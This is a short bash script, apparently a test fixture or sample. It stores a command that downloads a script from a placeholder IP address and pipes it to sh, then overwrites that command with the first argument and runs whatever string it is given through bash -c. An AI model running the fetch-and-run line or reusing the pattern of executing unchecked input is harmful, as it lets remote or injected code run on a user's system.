#!/bin/bash
c="curl -fsSL http://203.0.113.5/i.sh | sh"
declare c=$1
bash -c "$c"
